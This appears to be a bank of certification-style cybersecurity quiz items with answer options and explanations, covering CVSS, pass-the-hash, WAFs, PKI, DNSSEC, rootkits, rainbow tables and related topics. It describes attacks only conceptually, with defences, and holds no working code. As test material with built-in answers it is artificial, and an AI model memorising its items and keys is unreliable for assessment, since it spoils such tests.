questions.question: A vulnerability-management team has 2,400 open CVEs across the fleet and a fixed weekly patching budget. They need a vendor-neutral numeric score per CVE that combines base exploitability, impact on confidentiality/integrity/availability, and optional temporal and environmental modifiers, so they can rank patches objectively. Which framework provides this?
options: EV (Extended Validation) certificate grading from public CAs — EV grades the identity-verification process for TLS certificates, not the severity or exploitability of a software vulnerability
CVSS — the Common Vulnerability Scoring System
PCI-DSS section 6 mandates as a compliance-driven priority list
AV-TEST benchmark scores from independent antivirus reviewers
questions.explanation: CVSS produces a 0–10 numeric score per CVE with base, temporal, and environmental metrics, exactly matching the team's need for a vendor-neutral patch ranking. Bands: Critical 9.0–10, High 7.0–8.9, Medium 4.0–6.9, Low 0.1–3.9. EV grading rates certificate issuance assurance, not vulnerabilities. PCI-DSS section 6 lists controls, not per-CVE severity. AV-TEST scores antivirus products, not CVEs.

questions.question: A red-team report describes lateral movement inside a Windows domain. The attacker captured an NTLM hash from a workstation's LSASS memory and used it directly against an admin share on a different server. At no point was the plaintext password recovered or cracked, but the second host accepted the authentication. Which Windows-credentials attack is being demonstrated?
options: Pass-the-ticket — replaying a captured Kerberos TGT obtained from a domain controller, no NTLM hash used
Golden ticket — forging a Kerberos TGT directly signed with the captured KRBTGT account NTLM hash
Pass-the-hash — replaying the captured NTLM hash directly to authenticate as the user
Kerberoasting — requesting service tickets and cracking them offline, NTLM hash captured later
questions.explanation: In Windows, NTLM authentication sends the hash, not the password. An attacker who captures a hash can use it directly to authenticate. Mitigations: Credential Guard, LAPS, disable NTLM where possible.

questions.question: An e-commerce site behind an internet load balancer is hit weekly with SQL-injection, cross-site-scripting, and command-injection probes against its HTTP and HTTPS endpoints. The security team wants a Layer-7 control that inspects the actual HTTP request body and headers and blocks these application-layer payloads before they reach the EC2 backend — with no application code change. Which control is the right fit?
options: Next-generation firewall at the perimeter — inspects L3/L4 traffic but does not block command-injection HTTP payloads
Endpoint protection on the application servers — catches malware after the command-injection request reaches them
Bandwidth-shaping QoS appliance — shapes the application traffic but blocks no SQLi / XSS / command-injection
Web Application Firewall — inspects HTTP/S and blocks SQLi / XSS / CSRF / command-injection payloads at L7
questions.explanation: WAF operates at Layer 7 analyzing HTTP request content. Can be deployed as hardware, software, or cloud service (AWS WAF, Cloudflare, ModSecurity). Uses signature and behavioral rules to block web attacks.

questions.question: A security analyst reviewing authentication logs observes thousands of failed login attempts against a single account over two hours. Each attempt uses a different password following an alphabetical sequence: 'aaaa', 'aaab', 'aaac'. No leaked credential data was involved, and account lockout was disabled by a misconfiguration. Which attack type BEST describes this pattern?
options: Password spraying — tests one commonly used password across many accounts in sequence from a list, rather than testing every possible character combination against a single account

Credential stuffing — replays known username-password pairs from a publicly leaked breach database against target accounts in sequence — this uses a pre-existing breach list rather than testing every possible character combination in a sequential brute-force sweep
Dictionary attack — iterates through a curated wordlist of likely passwords and phrases rather than exhaustively testing every possible sequential character combination from scratch
Brute force attack — tests every possible character combination in sequence until the correct credential is found, without relying on wordlists or prior breach data
questions.explanation: The alphabetical sequential pattern ('aaaa', 'aaab'...) is the defining characteristic of brute force — it tests every combination without any prior knowledge of which passwords are likely. A dictionary attack would show wordlist entries like 'password123'; credential stuffing would use real email-password pairs from a breach; password spraying would target many accounts with one common password rather than exhausting all combinations against a single account.

questions.question: A browser is presented with a TLS certificate from bank.example.com. The browser does not directly accept that certificate; instead, it walks a hierarchy: bank.example.com is signed by Intermediate CA Foo, which is signed by Root CA Bar, which is in the browser's anchor store. Which concept does this describe?
options: TLS session encryption performed after the handshake completes
PKI chain of trust
802.1X port-based authentication used at the wired LAN edge
A firewall rule chain that filters connections at an intermediate proxy
questions.explanation: The PKI chain of trust is exactly the hierarchy described: an end-entity certificate is signed by an intermediate CA, which is signed by a root CA present in the relying party's trust store. Each link is cryptographically verified. TLS session encryption uses keys derived during the handshake but is a separate concern from chain validation. 802.1X authenticates network ports, not web identities. Firewalls filter traffic and do not validate certificate chains.

questions.question: A national registrar wants resolvers to cryptographically verify that a DNS reply actually came from the authoritative zone and was not forged in transit. The mechanism must publish public keys in the parent zone and sign each record set; encrypting the query itself is out of scope. Which standard meets this need?
options: DNS firewalling that blocks lookups against reputation lists — a DNS firewall rejects queries to known-malicious domains but does not cryptographically sign responses with public-key infrastructure to prevent spoofing
DNS-over-HTTPS, which encrypts queries between client and resolver
DNSSEC, which signs responses with public-key cryptography
GeoDNS load balancing that returns the closest regional answer
questions.explanation: DNSSEC signs DNS responses with public-key cryptography and chains the keys up through parent zones so resolvers can verify origin and integrity — exactly the requirement. DoH and DoT encrypt the query in flight (privacy) but do not authenticate the underlying record data. DNS firewalls block reputation lists; GeoDNS makes routing decisions. Neither provides origin authentication.

questions.question: After a privileged session on a production server, forensic memory captures show kernel-mode hooks redirecting both the file-listing API and the process-table API. Antivirus and the system administrator both report 'no malicious files' even though attacker-controlled binaries are clearly executing. Live response shows files appear in directory listings only when booted from a clean USB. Which malware class fits the evidence?
options: Trojan horse malware — disguised as legitimate files; not privileged kernel hooks and visible in process tables
Worm malware — self-propagating across the network with no privileged hooks hiding its files or process list
Logic-bomb malware — dormant payload in plain-sight files until triggered, no privileged process hiding hooks
Rootkit malware — privileged code that hooks the kernel to hide its files, processes, and network activity
questions.explanation: Rootkits modify the OS kernel or firmware to hide malicious activity. Kernel rootkits intercept system calls. Bootkit rootkits persist in MBR/UEFI. Detection requires out-of-band scanning (offline boot media) or firmware re-flash.

questions.question: An analyst with TOP SECRET clearance is denied access to a particular TOP SECRET briefing despite holding the right clearance level. The denial cites a specific principle: even with valid clearance, the analyst is not assigned to the project the briefing covers, so they have no legitimate work reason to read it. Which security principle is being applied?
options: Need-to-know — holding the required clearance is insufficient; a work-related justification is also mandatory for access

Separation of duties — splits a task across two people so no single person is holding complete control over the process, regardless of their clearance level — it limits insider fraud but is not about requiring a separate access justification per resource

Least privilege — restricts technical permissions to the minimum needed for the user's stated work function, even if the clearance is sufficient — least privilege limits access scope but does not require a separate work-related justification for each access request
Mandatory access control — the system enforces clearance-level rules regardless of personal reason
questions.explanation: 'Need to know' restricts access even among users with appropriate clearance levels. A classified user only gets access to specific classified information relevant to their role — not all classified data.

questions.question: An admin's MFA enrolment options include: (a) a small physical device (RSA SecurID / YubiKey) that displays or generates a one-time passcode, (b) a smartcard requiring a reader, (c) a TOTP app on the phone, (d) a printed list of recovery codes. The CISO asks specifically for the FIRST option — a dedicated cryptographic device — to be the primary factor for privileged users. What is that device called?
options: Software password manager — auto-fills credentials, not an MFA device
Hardware security token — standalone OTP device or FIDO2 key separate from the workstation
RFID proximity badge — physical access only, not a remote-auth OTP device
Smartcard — requires a card reader at the workstation, different form factor from a token
questions.explanation: A hardware security token is a physical device (RSA SecurID, YubiKey, hardware OTP) that generates one-time codes or signed assertions for MFA. Distinct from password managers (software, not an auth factor by itself), RFID badges (physical access only), and smartcards (a different form factor with a reader). NOTE: prior version had wrong correct-answer index (marked a mobile password manager as the hardware-token definition) — fixed 2026-05-13.

questions.question: A SOC analyst sees thousands of overnight login failures against the company login page. Each attempt uses a distinct account/secret pair, many matching real users in the directory. Threat intelligence correlates the pairs to a recent third-party breach. Which attack technique BEST describes what is happening right now?
options: Credential stuffing — replaying leaked credentials at the portal
Credential harvesting — building the upstream list via phishing or breach dumps
Password spraying — one common password tried slowly against many accounts
Brute force — exhaustively iterating every possible password for one account
questions.explanation: The portal is being hit with a list of pre-existing username/password pairs from a third-party breach — that is the textbook definition of credential stuffing. Credential harvesting is the upstream collection step (phishing, dumps, keyloggers) that produced the list, not the activity at the portal. Password spraying uses one common password across many accounts (rotation pattern is different). Brute force iterates passwords against a single account.

questions.question: A tier-1 SOC analyst handles 80 identical low-severity alerts each shift: look up the source IP against a threat feed, add an enforcement rule to the firewall if malicious, then close the ticket. The SOC manager wants to automate this repetitive workflow entirely so analysts can focus on complex investigations requiring human judgment. Which technology is purpose-built for this use case?
options: SIEM — ingests and correlates log data from firewalls, endpoints, and servers to surface alerts for analysts — it provides visibility across security data but does not execute automated response playbooks that free analysts from repetitive complex triage tasks
EDR — continuously records endpoint process creation, file modifications, and network connections, applying behavioral analytics to detect threats that bypass traditional signature-based defenses
SOAR — executes automated playbooks that enrich and triage incoming alerts, coordinate response actions across integrated tools, and free analysts for complex work
XDR — correlates detection telemetry across endpoints, network, cloud, and identity into a unified platform that surfaces multi-vector attack patterns invisible to individual siloed security tools
questions.explanation: SOAR (Security Orchestration, Automation, and Response) is purpose-built to automate repetitive, well-defined alert workflows using scripted playbooks — exactly the enrich-block-close pattern the analyst performs manually each shift. A SIEM surfaces alerts but does not act on them; it feeds SOAR rather than replacing it. EDR and XDR extend detection coverage but neither automates ticket-handling playbooks for routine low-severity alert triage.

questions.question: A company hires a penetration tester after an employee fell for a phishing email that delivered an initial access payload. The client wants to simulate the attacker's position from that point forward. The tester is given only a standard employee's Active Directory credentials and a VPN profile — no system diagrams, no source code, no admin access. Which engagement type matches this scope?
options: Black-box — the tester starts with no credentials and no prior information, replicating an external attacker perspective without any standard user account or insider knowledge of the architecture
White-box — the tester receives full architecture documentation, source code, and elevated credentials to achieve maximum assessment depth
Gray-box — the tester holds a standard user account and no architecture documentation, matching the attacker's post-phish foothold
Red team — a multi-phase exercise spanning several weeks that combines OSINT, social engineering, lateral movement, and physical intrusion attempts
questions.explanation: Gray-box testing gives the tester limited but realistic access — in this case a standard employee account — to simulate a threat actor who has completed initial access via phishing but lacks insider knowledge of the architecture. Black-box testing would not match because the attacker already has credentials; white-box would provide far greater access (admin, source code) than the scenario describes.

questions.question: An employee installs a free screen-recording utility downloaded from a third-party website. The recording features work correctly, but the company's EDR detects the application quietly exfiltrating documents to an external server in the background. No separate malware process was installed — the behavior originates entirely from within the user-installed application. Which malware category BEST describes this threat?
options: Ransomware — malware that encrypts the victim's files and withholds decryption until a ransom is paid — ransomware is often delivered via a Trojan application but is not itself an application disguising malicious code within a legitimate-looking package
Worm — self-replicating malware that propagates autonomously to adjacent hosts by exploiting vulnerabilities or abusing shared file systems
Trojan — malicious code bundled within a legitimate-looking application that activates its hidden payload after installation
Rootkit — kernel-level or firmware malware designed to conceal its presence and other malicious processes from host security controls
questions.explanation: A Trojan conceals malicious functionality within an application that appears legitimate or useful — the victim installs and runs it willingly, triggering the hidden payload. Unlike a worm, a Trojan does not self-propagate to other hosts. Unlike ransomware, it does not encrypt files for extortion. Unlike a rootkit, it does not subvert kernel structures to hide itself from the OS. The screen-recording utility that silently exfiltrates data while appearing functional is the textbook Trojan scenario.

questions.question: A flat-network breach allowed ransomware to spread across an entire /16. The remediation plan splits the network into zones by function (web, app, db, mgmt) at the firewall, AND further isolates each individual workload from its peers using host-level policy (distributed firewalls or SDN labels). The goals are to limit blast radius and prevent worm-style propagation. Which combination is described?
options: Link aggregation paired with redundant default gateways at the core — improves bandwidth and gateway availability but provides no workload-level isolation or east-west traffic policy enforcement between compute segments
Network function virtualization across consolidated x86 appliances
Network segmentation combined with workload-level microsegmentation
Re-flattening into a single broadcast domain to simplify policy
questions.explanation: Segmentation creates coarse zones at the firewall (VLAN/subnet boundaries). Microsegmentation adds fine-grained per-workload policy (VMware NSX, Cisco ACI, host firewalls) so even peers in the same zone cannot freely talk. The pair is the standard mitigation for worm/lateral-movement risk on a flat network. Link aggregation and NFV target throughput and consolidation, not isolation. Re-flattening is the opposite of the design.

questions.question: A penetration tester is auditing a system that uses a 64-bit hash for user-session tokens. The tester wants to find two different session payloads that produce the same hash, allowing one to be substituted for another. Statistical analysis shows roughly 2^32 attempts are needed before a collision is overwhelmingly likely. Which cryptographic attack class does this exploit?
options: Pre-image attack — find any input that produces a specific target hash, brute over the full hash space
Second pre-image attack — given an input, find a different input with the same hash (full hash space)
Birthday attack
Side-channel attack — measure hash-operation timing on the target device to leak internal state bits
questions.explanation: The birthday paradox: the probability of two people sharing a birthday reaches 50% at just 23 people. Similarly, hash collisions are found much faster than expected. MD5 is broken; SHA-256 provides much higher collision resistance.

questions.question: An online-banking user reports that funds transfers appear to leave the account for a different recipient than what was entered in the browser form. Forensic capture of the user's session shows the HTTPS connection to the bank is intact, but the transaction payload is being altered AFTER the user clicks Send and BEFORE it leaves the browser. Which threat BEST fits the evidence?
options: Man-in-the-browser malware — code inside the browser tampers with form data inside the user's session
Hardware keylogger — a physical device captures keystrokes from the user's input session
Stored XSS in a browser extension — injects script into the page during the browsing session
SQL injection in the banking backend — a crafted form value alters the query for that user's session
questions.explanation: MITB attacks (e.g., ZeuS, SpyEye) infect the browser via malicious extensions or process injection. They intercept banking transactions after the user authenticates, modifying payee/amount before submission.

questions.question: A standards body defines a security domain that covers four operations on a subject: (1) identification, (2) authentication, (3) authorisation of subject→object operations, and (4) accounting of those operations. Vendors implement the domain with badge readers, MFA prompts, role bindings, and audit logs. Which domain is being described?
options: Physical security, since badge readers and surveillance are the obvious case
Access control, covering the identify-authenticate-authorise-account lifecycle
Network firewalling, which decides which packets cross a boundary
Password policy, since credentials are the most common authentication factor
questions.explanation: Access control is the security domain spanning identification, authentication, authorisation, and accounting — often summarised as IAAA or AAA. Badge readers, MFA, RBAC, and audit logs are tactics that implement parts of this domain. Physical security and password policy are subsets/tactics. Firewalling controls packets, not subject↔object authorisation.

questions.question: A disgruntled developer is fired on Monday. On Friday at 5 pm, a payroll-system function fires and irreversibly corrupts every row in the salary table. Investigation reveals the developer planted code months earlier that checked both the current date AND the absence of the developer's username from the active-employees table. Which malware class is this?
options: A hardware destruction device installed in the data centre
Ransomware that activates on first execution after infection
A logic bomb that runs only when specific trigger conditions are met
A scheduled maintenance scanner that ran outside its approved window
questions.explanation: Logic bombs lie dormant inside legitimate code until a trigger condition fires — date, time, presence/absence of a record, etc. The dual-trigger (date + missing username) is textbook insider tradecraft. Ransomware fires on execution and demands payment, not on a delayed condition. The other options are not malware classes.

questions.question: A code review of a web API finds a handler that concatenates a user-supplied order_id directly into a SQL statement and into a shell command. The reviewer proposes a single upstream control: at the entry point of the handler, verify the value is a 36-character UUID, reject anything else, and pass only the validated value downstream. Which application-security practice is being applied?
options: Client-side form compression to reduce request payload size
TLS encryption in transit between the browser and the API gateway
Audit logging of every database statement executed by the handler
Input validation that rejects malformed values at the API boundary
questions.explanation: Input validation checks type, length, format, and range at the boundary and refuses anything that does not match — preventing both SQL injection and command injection in this handler. It must run server-side; client-side checks can be bypassed. TLS protects bytes on the wire but not the query the server builds. Audit logging records what happened; it does not prevent the injection.

questions.question: A signed-contract dispute lands in litigation. The relying party must prove that (a) a specific employee — not someone else — sent the contract, and (b) that employee cannot credibly deny having sent it. Forensic email logs alone aren't enough; the standard control combines a cryptographic signature with append-only audit logs. Which security property does this provide?
options: Non-repudiation, proven by a digital signature plus tamper-evident logging
Confidentiality, secured by encrypting the contract under the recipient's public key
Integrity, proven by a hash or signature attached to the contract bytes
Availability, ensured by replicated storage and a documented retention policy
questions.explanation: Non-repudiation prevents a party from credibly denying an action. A digital signature binds the signer's private key to the document, and tamper-evident audit logs bind the system action to a recorded actor — together they satisfy both prove-the-sender and prevent-denial requirements. Confidentiality, integrity, and availability are distinct CIA properties.

questions.question: A bank is dismantling its corporate VPN. Going forward, every access to an internal service — even from a laptop physically inside HQ — must independently prove user identity, device posture (patched, MDM-enrolled), and least-privilege authorisation per request. Network location grants nothing. Which security model is being adopted?
options: Perimeter trust model — implicit trust once inside the corporate network; opposite of what's described
Zero Trust
Bring-Your-Own-CA — any device with an approved certificate gets access; ignores device posture
Zero-tolerance HR policy — unrelated; about employee conduct, not authorisation
questions.explanation: Zero Trust treats every request as untrusted by default — identity + device posture + per-request authorisation are evaluated regardless of network location. NIST SP 800-207 is the canonical reference. Perimeter trust is the older model being replaced. NOTE: prior version had wrong correct-answer index (marked a 'zero-tolerance' HR policy as zero-trust) — fixed 2026-05-13.

questions.question: A 4,000-employee enterprise is hiring for a C-suite role. The role owns the information-security programme, sets risk-acceptance thresholds, presents the cyber posture to the audit committee, and budgets the security organisation. The role does NOT operate alerts day-to-day (that is the SOC manager's job). Which role is being described?
options: A SIEM platform owner managing rule packs and dashboards — a SIEM owner operates a technical tool for collecting security information but does not have the executive authority or accountability for the overall security programme
A vendor-issued security certification programme manager
A Chief Information Security Officer accountable to the board
A control framework such as the NIST Cybersecurity Framework
questions.explanation: The CISO is the executive owner of the security programme: strategy, risk acceptance, budget, board reporting, and oversight of incident response. The SOC manager runs day-to-day detection and triage — a distinct role one or two layers below the CISO. The other options are a platform, a credential, and a framework — not people.

questions.question: A software publisher wants every customer's installer to carry a verifiable claim binding (1) the publisher's identity and (2) the integrity of the binary as released — so that any modification by an attacker after release is detected by the operating system at install time. Which control is being described?
options: TLS server certificates issued to the download CDN's hostname
A code-signing certificate issued to the vendor and applied to the installer
S/MIME certificates issued to the developers who built the release
A SHA-256 hash posted on the download page next to the installer link
questions.explanation: Code-signing certificates bind the publisher's identity to the binary via a digital signature, which the OS verifies before installation. Any post-release modification breaks the signature. TLS certs authenticate the download host, not the artefact itself. S/MIME signs email, not executables. A posted hash gives integrity but no bound publisher identity — anyone could post a different hash for a different binary.

questions.question: An organisation wants to issue and manage thousands of digital certificates internally: a root authority (kept offline), one or more intermediates (online, issuing), end-entity certificates, revocation lists, and policy documents. Together these components let the org cryptographically authenticate users, servers, and code. Which umbrella term covers this entire system?
options: PKI — Public Key Infrastructure: anchor CA + issuing intermediates + leaf certs + CRLs + policies

PAM — Privileged Access Management: vaulting service-account passwords and controlling privileged session access, not issuing leaf certificates through a chain of issuing intermediates from an anchor CA
PSK — Pre-shared key model: symmetric secret per pair, no CA hierarchy
PEP — Policy Enforcement Point: where access decisions are applied, not where certs are issued
questions.explanation: PKI: Root CA (trust anchor, offline), Subordinate/Issuing CAs (online, issue end-entity certs), Registration Authority, certificate store, revocation (CRL/OCSP). Basis for TLS, code signing, smart card auth, S/MIME email encryption.

questions.question: A red-team report describes the operators' tradecraft: encoding payloads in base64, hiding command-and-control inside DNS queries, modifying file timestamps to match neighbouring system files, clearing event logs, and relying on built-in Windows utilities (PowerShell, WMI) instead of dropping new executables. Which umbrella category captures these techniques?
options: Physical pretexting used to gain initial access to a facility
Defence-evasion and anti-forensics, including living-off-the-land binaries
Network compression to reduce bandwidth used by exfiltrated payloads
Distributed denial-of-service mitigation deployed at the network edge
questions.explanation: All techniques listed (encoding, DNS C2, timestomping, log clearing, LotL) are post-compromise tactics to evade detection and frustrate forensics. ATT&CK groups them under the Defense Evasion tactic. Pretexting is a social-engineering initial-access technique. The remaining options are unrelated to attacker tradecraft.

questions.question: Procurement asks the CISO whether the upcoming PCI-DSS exercise is an 'audit' or an 'assessment'. The CISO clarifies: one is a formal pass/fail review against a published standard, conducted by an accredited external party with attestation requirements; the other is a broader gap-analysis that may use multiple frameworks and produces a remediation roadmap rather than a certificate. Which distinction matches?
options: Audit and assessment are interchangeable terms for the same formal pass/fail engagement against any standard, including PCI-DSS
Audit = active exploitation by a red team against the standard; assessment = a broader formal pass/fail paperwork review
Audit = formal compliance verdict by a qualified evaluator; assessment = advisory engagement without a binary outcome
Assessment = annual formal pass/fail audit reused verbatim; audit = the broader pass/fail re-test against the standard
questions.explanation: Audit: checks compliance against defined controls/standards, formal opinion (pass/qualified). Assessment: risk-based evaluation of overall security posture. Organizations need both: audits for compliance, assessments for risk management.

questions.question: An attacker has stolen the `/etc/shadow` file of a Linux server. The hashes are unsalted SHA-1. To recover passwords, the attacker uses a precomputed lookup table mapping millions of common passwords to their SHA-1 hashes, with chains that compress storage. Recovery of any unsalted password in the file takes seconds. Which attack and which BEST defence apply?
options: ARP poisoning attack; defence is a static ARP table — wrong, unrelated to password storage
Power side-channel attack; defence is constant-time crypto — wrong, attacker has the hash file already
Credential stuffing; defence is rate-limiting — wrong, attacker is not trying live login attempts
Rainbow-table attack; defence is salting each password before hashing (and using a slow KDF like bcrypt/Argon2)
questions.explanation: Rainbow tables precompute hash(password) for millions of passwords — lookup is instant. Defense: salting adds a random value per user before hashing (stored with the hash). Even with table, attacker must rebuild one for each salt. Modern algorithms: bcrypt, Argon2, scrypt all include salt automatically.
